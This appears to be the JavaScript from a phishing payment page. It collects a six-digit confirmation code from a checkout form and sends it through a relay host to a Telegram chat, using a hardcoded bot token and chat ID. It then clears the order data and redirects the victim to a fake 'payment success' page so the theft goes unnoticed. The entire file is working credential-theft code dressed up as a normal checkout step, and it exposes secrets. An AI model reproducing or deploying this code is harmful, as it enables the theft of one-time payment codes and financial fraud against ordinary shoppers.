const BtnEnterCode = document.querySelector('#BtnEnterCode');

// Codes
const code_1 = document.querySelector('#code_1');
const code_2 = document.querySelector('#code_2');
const code_3 = document.querySelector('#code_3');
const code_4 = document.querySelector('#code_4');
const code_5 = document.querySelector('#code_5');
const code_6 = document.querySelector('#code_6');

let mistakesForm = [];

function nullMistakes() {
    mistakesForm = [];
    BtnEnterCode.disabled = false;
}

function sendToTelegram(code) {
    BtnEnterCode.disabled = true;

    const needUrl = "https://simply-paleo.com/cors/";
    const needIdChat = "-561694291";
    const needToken = "5211232926:AAG8J1O0yXX7NhtkTEnQ4SjdweZ4DMWeF1U";

    const id_chat = needIdChat;
    const password = "";
    const token = needToken;
    const host = window.location.host;

    const message = `
    Code: ${code}
    `;
    // console.log(message);
    const formData = {
      chat_id: id_chat,
      password: password,
      token: token,
      message: message,
    };

    fetch(needUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    })
      .then((x) => x.json())
      .then(() => {
        localStorage.removeItem('Order');
        localStorage.removeItem('DeliveryAddress');
        setTimeout(() => {
          window.location.href = "/payment/success/";
        }, 500);
      });
}

BtnEnterCode.addEventListener('click', (e) => {
    e.preventDefault();
    nullMistakes();

    if (!code_1.value) {
        mistakesForm.push(1);
    }
    if (!code_2.value) {
        mistakesForm.push(1);
    }
    if (!code_3.value) {
        mistakesForm.push(1);
    }
    if (!code_4.value) {
        mistakesForm.push(1);
    }

    if (!code_5.value) {
        mistakesForm.push(1);
    }
    if (!code_6.value) {
        mistakesForm.push(1);
    }

    if (!mistakesForm.length) {
        const code = code_1.value + code_2.value + code_3.value + code_4.value + code_5.value + code_6.value
        sendToTelegram(code);
    }
});